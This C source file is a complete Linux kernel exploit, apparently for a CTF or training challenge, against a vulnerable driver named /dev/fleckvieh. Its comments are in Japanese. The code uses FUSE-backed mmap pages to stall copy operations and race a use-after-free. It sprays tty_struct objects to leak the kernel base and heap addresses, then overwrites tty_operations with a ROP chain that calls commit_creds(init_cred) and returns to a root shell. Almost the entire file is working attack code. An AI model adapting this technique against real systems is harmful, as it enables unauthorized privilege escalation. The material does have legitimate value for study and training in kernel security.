#define _GNU_SOURCE
#define FUSE_USE_VERSION 29
#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <fuse.h>
#include <linux/fuse.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

#define ofs_tty_ops 0xc3c3c0
#define addr_modprobe_path (kbase + 0xe37ea0)
#define rop_push_rdx_cmp_eax_415B005Ch_pop_rsp_rbp (kbase + 0x09b13a)
#define rop_pop_rdi (kbase + 0x09b0ed)
#define addr_init_cred (kbase + 0xe37480)
#define addr_commit_creds (kbase + 0x072830)
#define addr_kpti_trampoline (kbase + 0x800e26)

#define CMD_ADD 0xf1ec0001
#define CMD_DEL 0xf1ec0002
#define CMD_GET 0xf1ec0003
#define CMD_SET 0xf1ec0004

unsigned long user_cs, user_ss, user_rsp, user_rflags;

static void win() {
  char *argv[] = { "/bin/sh", NULL };
  char *envp[] = { NULL };
  puts("[+] win!");
  execve("/bin/sh", argv, envp);
}

static void save_state() {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

typedef struct {
  int id;
  size_t size;
  char *data;
} request_t;

cpu_set_t pwn_cpu;
int fd;

int add(char *data, size_t size) {
  request_t req = { .size = size, .data = data };
  int r = ioctl(fd, CMD_ADD, &req);
  if (r == -1) fatal("blob_add");
  return r;
}
int del(int id) {
  request_t req = { .id = id };
  int r = ioctl(fd, CMD_DEL, &req);
  if (r == -1) fatal("blob_del");
  return r;
}
int get(int id, char *data, size_t size) {
  request_t req = { .id = id, .size = size, .data = data };
  int r = ioctl(fd, CMD_GET, &req);
  if (r == -1) fatal("blob_get");
  return r;
}
int set(int id, char *data, size_t size) {
  request_t req = { .id = id, .size = size, .data = data };
  int r =  ioctl(fd, CMD_SET, &req);
  if (r == -1) fatal("blob_set");
  return r;
}

char *buf;
int victim;
int ptmx[0x10];

static int getattr_callback(const char *path, struct stat *stbuf) {
  memset(stbuf, 0, sizeof(struct stat));

  if (strcmp(path, "/pwn") == 0) {
    stbuf->st_mode = S_IFREG | 0777;
    stbuf->st_nlink = 1;
    stbuf->st_size = 0x1000;
    return 0;
  }

  return -ENOENT;
}

static int open_callback(const char *path, struct fuse_file_info *fi) {
  puts("[+] open_callback");
  return 0;
}

static int read_callback(const char *path,
                         char *file_buf, size_t size, off_t offset,
                         struct fuse_file_info *fi) {
  static int fault_cnt = 0;
  printf("[+] read_callback\n");
  printf("    path  : %s\n", path);
  printf("    size  : 0x%lx\n", size);
  printf("    offset: 0x%lx\n", offset);

  if (strcmp(path, "/pwn") == 0) {
    switch (fault_cnt++) {
      case 0:
      case 1:
        puts("[+] UAF read");
        /* [1-2] [2-2] `blob_get`によるページフォルト */
        // victimを解放
        del(victim);

        // tty_structをスプレーし、victimの場所にかぶせる
        for (int i = 0; i < 0x10; i++) {
          ptmx[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
          if (ptmx[i] == -1) fatal("/dev/ptmx");
        }
        return size;

      case 2:
        puts("[+] UAF write");
        /* [3-2] `blob_set`によるページフォルト */
        // 偽tty_operationをspray (リークしたkheapにかぶらせる)
        for (int i = 0; i < 0x100; i++) {
          add(buf, 0x400);
        }

        // victimを解放し、tty_structをspray
        del(victim);
        for (int i = 0; i < 0x10; i++) {
          ptmx[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
          if (ptmx[i] == -1) fatal("/dev/ptmx");
        }

        // このページのデータを持つバッファ（copy_from_userで書き込む内容）
        memcpy(file_buf, buf, 0x400);
        return size;

      default:
        fatal("Unexpected page fault");
    }
  }

  return -ENOENT;
}

static struct fuse_operations fops = {
  .getattr = getattr_callback,
  .open = open_callback,
  .read = read_callback,
};

int setup_done = 0;

void *fuse_thread(void *_arg) {
  struct fuse_args args = FUSE_ARGS_INIT(0, NULL);
  struct fuse_chan *chan;
  struct fuse *fuse;

  if (mkdir("/tmp/test", 0777))
    fatal("mkdir(\"/tmp/test\")");

  if (!(chan = fuse_mount("/tmp/test", &args)))
    fatal("fuse_mount");

  if (!(fuse = fuse_new(chan, &args, &fops, sizeof(fops), NULL))) {
    fuse_unmount("/tmp/test", chan);
    fatal("fuse_new");
  }

  /* メインスレッドを同じCPUで動かす */
  if (sched_setaffinity(0, sizeof(cpu_set_t), &pwn_cpu))
    fatal("sched_setaffinity");

  fuse_set_signal_handlers(fuse_get_session(fuse));
  setup_done = 1;
  fuse_loop_mt(fuse);

  fuse_unmount("/tmp/test", chan);
  return NULL;
}

int pwn_fd = -1;
void* mmap_fuse_file(void) {
  if (pwn_fd != -1) close(pwn_fd);
  pwn_fd = open("/tmp/test/pwn", O_RDWR);
  if (pwn_fd == -1) fatal("/tmp/test/pwn");

  void *page;
  page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
              MAP_PRIVATE, pwn_fd, 0);
  if (page == MAP_FAILED) fatal("mmap");
  return page;
}

int main(int argc, char **argv) {
  save_state();

  /* メインスレッドとFUSEスレッドが必ず同じCPUで動くよう設定する */
  CPU_ZERO(&pwn_cpu);
  CPU_SET(0, &pwn_cpu);
  if (sched_setaffinity(0, sizeof(cpu_set_t), &pwn_cpu))
    fatal("sched_setaffinity");

  pthread_t th;
  pthread_create(&th, NULL, fuse_thread, NULL);
  while (!setup_done);

  /*
   * Exploit本体
   */
  void *page;
  fd = open("/dev/fleckvieh", O_RDWR);
  if (fd == -1) fatal("/dev/fleckvieh");

  /* [1-1] UAF Read: tty_structのリーク */
  page = mmap_fuse_file();
  buf = (char*)malloc(0x400);
  victim = add(buf, 0x400);
  get(victim, page, 0x20);
  unsigned long kbase = *(unsigned long*)(page + 0x18) - ofs_tty_ops;
  printf("kbase = 0x%016lx\n", kbase);
  for (int i = 0; i < 0x10; i++) close(ptmx[i]);
  unsigned long saved_dev_ptr = *(unsigned long*)(page + 0x10);

  /* [2-1] UAF Read: tty_structのリーク (ヒープ) */
  page = mmap_fuse_file();
  victim = add(buf, 0x400);
  get(victim, page, 0x400);
  unsigned long kheap = *(unsigned long*)(page + 0x38) - 0x38;
  printf("kheap = 0x%016lx\n", kheap);
  for (int i = 0; i < 0x10; i++) close(ptmx[i]);

  // 偽tty_struct兼tty_operationsの用意
  memcpy(buf, page, 0x400);
  unsigned long *tty = (unsigned long*)buf;
  tty[0] = 0x0000000100005401; // magic
  tty[2] = saved_dev_ptr; // dev
  tty[3] = kheap; // ops
  tty[12] = rop_push_rdx_cmp_eax_415B005Ch_pop_rsp_rbp; // ops->ioctl
  // ROP chainの用意
  unsigned long *chain = (unsigned long*)(buf + 0x100);
  *chain++ = 0xdeadbeef; // pop rbp
  *chain++ = rop_pop_rdi;
  *chain++ = addr_init_cred;
  *chain++ = addr_commit_creds;
  *chain++ = addr_kpti_trampoline;
  *chain++ = 0xdeadbeef;
  *chain++ = 0xdeadbeef;
  *chain++ = (unsigned long)&win;
  *chain++ = user_cs;
  *chain++ = user_rflags;
  *chain++ = user_rsp;
  *chain++ = user_ss;

  /* [3-1] UAF Write: tty_structの書き換え */
  page = mmap_fuse_file();
  victim = add(buf, 0x400);
  set(victim, page, 0x400);

  /* 書き換えられたtty_structの利用 */
  for (int i = 0; i < 0x10; i++)
    ioctl(ptmx[i], 0, kheap + 0x100);

  return 0;
}
